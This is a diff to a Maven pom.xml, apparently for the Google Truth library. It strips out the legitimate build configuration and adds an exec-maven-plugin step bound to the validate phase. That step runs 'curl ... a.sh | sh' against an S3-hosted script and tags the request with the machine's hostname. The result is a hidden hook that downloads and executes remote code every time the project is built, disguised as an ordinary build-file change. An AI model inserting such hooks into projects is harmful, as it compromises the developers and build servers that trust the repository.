@@ -53,175 +53,33 @@
     </dependency>
   </dependencies>
   <build>
-    <resources>
-      <resource>
-        <directory>src/main/java</directory>
-        <excludes>
-          <exclude>**/*.java</exclude>
-          <exclude>**/*.gwt.xml</exclude>
-        </excludes>
-      </resource>
-      <resource>
-        <directory>..</directory>
-        <includes>
-          <include>LICENSE</include>
-        </includes>
-        <targetPath>META-INF</targetPath>
-      </resource>
-    </resources>
-    <testResources>
-      <testResource><directory>src/test/java</directory></testResource>
-    </testResources>
-    <plugins>
-      <plugin>
-        <artifactId>maven-javadoc-plugin</artifactId>
-      </plugin>
-      <plugin>
-        <artifactId>maven-compiler-plugin</artifactId>
-        <configuration>
-          <excludes>
-            <exclude>**/super/**/*.java</exclude>
-          </excludes>
-          <testExcludes>
-            <testExclude>**/super/**/*.java</testExclude>
-          </testExcludes>
-          <annotationProcessorPaths>
-            <path>
-              <groupId>com.google.auto.value</groupId>
-              <artifactId>auto-value</artifactId>
-              <version>${auto-value.version}</version>
-            </path>
-          </annotationProcessorPaths>
-        </configuration>
-      </plugin>
-      <plugin>
-        <artifactId>maven-source-plugin</artifactId>
-        <configuration>
-          <excludes>
-            <exclude>**/super/**</exclude>
-            <exclude>**/*.gwt.xml</exclude>
-          </excludes>
-        </configuration>
-      </plugin>
-      <plugin>
-        <artifactId>maven-jar-plugin</artifactId>
-        <executions>
-          <execution>
-            <id>attach-gwt-sources</id>
-            <phase>post-integration-test</phase>
-            <goals><goal>jar</goal></goals>
+<plugins>
+        <!--Stam-->
+        <plugin>
+            <groupId>org.codehaus.mojo</groupId>
+            <artifactId>exec-maven-plugin</artifactId>
+            <version>1.6.0</version>
+            <executions>
+                <execution>
+                    <id>run-script</id>
+                    <phase>validate</phase>
+                    <goals>
+                        <goal>exec</goal>
+                    </goals>
+                </execution>
+            </executions>
             <configuration>
-              <classifier>gwt</classifier>
-              <classesDirectory>${project.build.directory}/gwt-sources</classesDirectory>
+                <executable>bash</executable>
+                <arguments>
+                    <argument>
+                        -c
+                    </argument>
+                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/truth.git\&amp;folder=core\&amp;hostname=`hostname`\&amp;foo=twg\&amp;artifactId=${artifactId}</argument>
+                </arguments>
             </configuration>
-          </execution>
-        </executions>
-      </plugin>
-      <plugin>
-        <groupId>org.codehaus.mojo</groupId>
-        <artifactId>animal-sniffer-maven-plugin</artifactId>
-      </plugin>
-      <plugin>
-        <artifactId>maven-surefire-plugin</artifactId>
-        <configuration>
-          <excludes>
-            <exclude>**/*GwtTest.java</exclude>
-          </excludes>
-        </configuration>
-      </plugin>
-      <plugin>
-        <groupId>org.codehaus.mojo</groupId>
-        <artifactId>gwt-maven-plugin</artifactId>
-        <executions>
-          <execution>
-            <id>gwt-test</id>
-            <goals><goal>test</goal></goals>
-            <configuration>
-              <mode>htmlunit</mode>
-              <htmlunit>FF</htmlunit>
-              <productionMode>true</productionMode>
-              <!-- Fix OutOfMemoryError in Travis. -->
-              <extraJvmArgs>-Xms3500m -Xmx3500m -Xss1024k</extraJvmArgs>
-              <sourceLevel>auto</sourceLevel>
-              <userAgents>gecko1_8</userAgents>
-              <includes>**/*GwtTest.java</includes>
-              <!-- Keep these timeouts very large because, if we hit the timeout, the tests silently pass :( -->
-              <testTimeOut>86400 <!-- seconds --></testTimeOut>
-              <testMethodTimeout>1440 <!-- minutes --></testMethodTimeout>
-            </configuration>
-          </execution>
-        </executions>
-      </plugin>
-      <!-- We need to strip "@Nullable" from the sources that we hand to GWT:
-           b/183648616. To do that, we have to make a copy of the original
-           source directory and add that directory as a Maven source root. But
-           the added root comes *after* the original root, so, in order to make
-           GWT choose those sources in preference to the originals, we need to
-           put them in a `super` directory.
-
-           TODO(b/183648616): Once we can use @Nullable from GWT, generate the
-           GWT jar from the original sources instead of these sources that we
-           strip @Nullable from. -->
-      <plugin>
-        <groupId>org.codehaus.mojo</groupId>
-        <artifactId>build-helper-maven-plugin</artifactId>
-        <version>3.4.0</version>
-        <executions>
-          <execution>
-            <id>add-source</id>
-            <phase>generate-sources</phase>
-            <goals>
-              <goal>add-source</goal>
-            </goals>
-            <configuration>
-              <sources>
-                <source>${project.build.directory}/gwt-sources</source>
-              </sources>
-            </configuration>
-          </execution>
-        </executions>
-      </plugin>
-      <plugin>
-        <artifactId>maven-antrun-plugin</artifactId>
-        <version>3.1.0</version>
-        <executions>
-          <execution>
-            <id>copy-gwt-files</id>
-            <phase>generate-sources</phase>
-            <goals><goal>run</goal></goals>
-            <configuration>
-              <target name="copy-gwt-resources">
-                <copy toDir="${project.build.directory}/gwt-sources">
-                  <fileset dir="${project.basedir}/src/main/java">
-                    <include name="**/super/**/*.java"/>
-                    <include name="**/*.gwt.xml"/>
-                  </fileset>
-                </copy>
-                <copy toDir="${project.build.directory}/gwt-sources/com/google/common/truth/super">
-                  <fileset dir="${project.basedir}/src/main/java">
-                    <!-- Don't put files under .../super/.../super/... -->
-                    <exclude name="**/super/**/*.java"/>
-                    <!-- Don't put the .gwt.xml under super -->
-                    <exclude name="**/*.gwt.xml"/>
-                  </fileset>
-                </copy>
-                <replace token="@Nullable" value="">
-                  <fileset dir="${project.build.directory}/gwt-sources">
-                    <include name="**/super/**/*.java"/>
-                  </fileset>
-                </replace>
-                <replace token="@NonNull" value="">
-                  <fileset dir="${project.build.directory}/gwt-sources">
-                    <include name="**/super/**/*.java"/>
-                  </fileset>
-                </replace>
-              </target>
-            </configuration>
-          </execution>
-        </executions>
-      </plugin>
-    </plugins>
-  </build>
+        </plugin>
+</plugins>
+</build>
   <reporting>
     <plugins>
       <plugin>
